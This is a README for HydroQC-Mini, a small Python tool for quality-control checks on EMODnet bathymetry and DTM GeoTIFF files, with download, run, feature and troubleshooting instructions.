# 🌊 HydroQC-Mini - Quick and Easy Quality Control Tool

[![Download HydroQC-Mini](https://img.shields.io/badge/Download-HydroQC--Mini-brightgreen)](https://github.com/rickchen116/HydroQC-Mini/releases)

## 📋 Description
HydroQC Mini is a lightweight Python tool that runs quick quality assurance and quality control (QA/QC) on EMODnet bathymetry and DTM GeoTIFF tiles. It exports a markdown report, JSON summary, and diagnostic maps that help visualize depth, missing data, outliers, slope, and roughness. This application aims to make data validation simpler for users working with geospatial data.

## 🚀 Getting Started
Follow these steps to download and run HydroQC Mini effortlessly.

### 🖥️ System Requirements
- Windows, macOS, or Linux operating system.
- Python 3.7 or higher installed on your computer.
- Basic knowledge of file navigation on your operating system.
- Ideally, you should have at least 1 GB of free disk space.

## 🔗 Download & Install
To download HydroQC Mini, visit this page to download: [HydroQC-Mini Releases](https://github.com/rickchen116/HydroQC-Mini/releases)

### 📥 Installation Instructions
1. Go to the [HydroQC-Mini Releases](https://github.com/rickchen116/HydroQC-Mini/releases) page.
2. Find the latest release at the top of the page.
3. Look for the assets section and choose the file that corresponds to your operating system (for example, `HydroQC-Mini-Windows.zip` for Windows users).
4. Click on the file to start your download.
5. Once the download is complete, locate the file on your computer (usually in your Downloads folder).
6. Extract the zipped file if necessary. On Windows, right-click the file and choose "Extract All."

## ⚙️ Running HydroQC Mini
After installation, follow these steps to run HydroQC Mini:

1. Open a command prompt or terminal window on your computer.
2. Navigate to the directory where you extracted HydroQC Mini files. Use the `cd` (change directory) command. For example:
   - **Windows:** `cd Downloads/HydroQC-Mini`
   - **macOS/Linux:** `cd ~/Downloads/HydroQC-Mini`
3. Type the command to run the application:
   ```
   python hydroqc_mini.py <path_to_your_geotiff_file>
   ```
   Be sure to replace `<path_to_your_geotiff_file>` with the actual path to your GeoTIFF file.
4. Press Enter to execute the command.

## 📊 Features
- Quick validation of bathymetry and DTM GeoTIFF files.
- Generates comprehensive markdown reports for easy review.
- Creates JSON summaries for data insights.
- Produces diagnostic maps to visualize depth and other metrics.
- Supports multiple operating systems.

## 📝 Usage Example
To see how HydroQC Mini works, you can run the command like this:
```
python hydroqc_mini.py /path/to/your/data/file.tif
```
This command will analyze the specified GeoTIFF file and generate the reports accordingly.

## 🛠️ Troubleshooting
If you encounter any issues, consider the following steps:
- Ensure you have the correct version of Python installed.
- Make sure all files are in the correct directory.
- Check if the GeoTIFF file path is accurate.
- Revisit the installation steps to ensure nothing was missed.

## 🆘 Need Help?
If you need further assistance, please visit the [Issues section](https://github.com/rickchen116/HydroQC-Mini/issues) of this repository. You can report problems or ask for help from the community.

## 🌐 Topics
- bathymetry
- data-validation
- emodnet
- geospatial
- geotiff
- gis
- python
- quality-control
- rasterio
- remote-sensing

For those interested in learning more about the concepts or terminology used in HydroQC Mini, consider researching these topics.

## 🤝 Contribution
We welcome contributions from everyone. If you have suggestions, improvements, or code to share, please open a pull request or submit an issue. Your input helps make HydroQC Mini an even better tool.

## 🔗 Links
- [HydroQC-Mini Releases](https://github.com/rickchen116/HydroQC-Mini/releases)
- [Open Issues](https://github.com/rickchen116/HydroQC-Mini/issues)

Thank you for using HydroQC Mini! We hope it makes your data quality control tasks easier and more efficient.